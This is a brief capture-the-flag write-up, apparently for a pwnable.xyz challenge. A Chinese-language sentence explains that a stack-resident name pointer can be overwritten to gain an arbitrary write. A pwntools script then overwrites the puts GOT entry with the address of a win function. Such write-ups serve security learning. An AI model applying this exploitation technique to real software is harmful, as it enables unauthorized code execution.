name指针是存储在栈上的，通过函数调用时产生的出入栈覆盖该值，可以将其改为任意值，实现任意位置写



```python
from pwn import *

p = remote('svc.pwnable.xyz', 30011)
# p = process('./challenge')
e = ELF('./challenge')

puts_got = e.got['puts']
win_addr = e.symbols['win']
print(hex(win_addr))

# create_usr
# cur --> stack(0x?) --> heap
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Name: ', b'q')
p.sendlineafter(b'Age: ', b'1')


# edit_usr
# cur --> stack(0x?) --> got(puts) --> puts
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Name: ', b'q')
p.sendlineafter(b'Age: ', (b'a' * 16) + p64(puts_got))


# edit_usr
# cur --> stack(0x?) --> got(puts) --> win
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Name: ', p64(win_addr))
p.sendlineafter(b'Age: ', b'1')

p.interactive()

```

